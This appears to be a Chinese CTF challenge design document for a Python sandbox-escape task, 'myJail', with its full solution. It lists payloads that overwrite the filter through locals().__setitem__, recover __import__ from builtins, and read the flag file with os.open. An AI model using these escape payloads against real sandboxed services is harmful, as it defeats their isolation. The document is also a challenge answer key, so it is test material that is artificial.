# 赛题设计说明

## 题目信息

- 题目名称：myJail
- 预估难度：中等

## 题目描述

小J喜欢变魔术，但是这次小J不小心把自己困住了，救救小J。

## 考点

1. python魔术方法
2. python locals()修改函数对象

## 出题思路与解题思路

### 出题思路
pyjail题，通过利用__setitem__魔术方法，绕过过滤。
### 解题思路
首先先修改过滤函数。
~~~
locals().__setitem__("my_filter",str)
~~~
由于`__import__`被覆盖了，所以要去`builtins`里面找`__import__`
~~~
print(__builtins__.__import__("os").listdir('/'))
~~~
可以恢复`__import__`
~~~
locals().__setitem__('__import__',__builtins__.__import__)
~~~

借用其他的变量来缩短payload
~~~
locals().__setitem__('dir',__import__("os"))
~~~
利用`os.open`来读文件
~~~
print(dir.read(dir.open("/FlAg_1s_H3re",0),100))
~~~

获得之后读取文件即可
## 提示

1. 可不可以改函数呢

## 参考

2023强网杯pyjail
